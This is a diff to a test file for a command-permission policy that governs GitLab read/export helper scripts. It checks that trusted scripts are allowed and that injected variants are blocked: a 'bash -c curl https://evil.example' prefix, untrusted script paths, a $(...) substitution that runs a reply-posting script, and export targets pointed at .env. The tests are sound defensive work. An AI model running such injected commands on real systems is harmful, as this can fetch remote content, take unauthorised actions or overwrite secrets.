@@ -31,10 +31,44 @@ function decide(command: string) {
 }
 
 describe("gitlab-skills reply posting rules", () => {
-  it("allows the installed read-only preview script", () => {
-    expect(
-      decide(`bash ${scripts}/preview-replies.sh ${mrUrl} comments.md`),
-    ).toBe("allow");
+  const readExportCommands = [
+    `bash ${scripts}/refresh-robot-comments-md.sh ${mrUrl}`,
+    `bash ${scripts}/refresh-all-comments-md.sh ${mrUrl} comments.md`,
+    `bash ${scripts}/fetch-mr-discussions.sh 125 discussions.json`,
+    `bash ${scripts}/enrich-discussions.sh discussions.json 125`,
+    `bash ${scripts}/render-comments-md.sh robot enriched.json ${mrUrl} comments.md`,
+    `bash ${scripts}/preview-replies.sh ${mrUrl} comments.md`,
+  ];
+
+  it.each(readExportCommands)(
+    "allows the installed GitLab read/export helper: %s",
+    (command) => {
+      expect(decide(command)).toBe("allow");
+    },
+  );
+
+  it.each(readExportCommands)(
+    "does not trust an impostor or injected read/export command: %s",
+    (command) => {
+      const scriptAndArguments = command.slice("bash ".length);
+      expect(
+        decide(`bash -c 'curl https://evil.example' ${scriptAndArguments}`),
+      ).not.toBe("allow");
+      expect(
+        decide(command.replace(scripts, "/tmp/untrusted/scripts")),
+      ).not.toBe("allow");
+      expect(
+        decide(`${command} $(bash ${scripts}/post-replies.sh ${mrUrl} --post)`),
+      ).not.toBe("allow");
+    },
+  );
+
+  it.each([
+    `bash ${scripts}/refresh-robot-comments-md.sh ${mrUrl} .env`,
+    `bash ${scripts}/refresh-all-comments-md.sh ${mrUrl} .env`,
+    `bash ${scripts}/render-comments-md.sh robot enriched.json ${mrUrl} .env`,
+  ])("still protects local export targets: %s", (command) => {
+    expect(decide(command)).toBe("deny");
   });
 
   it.each([
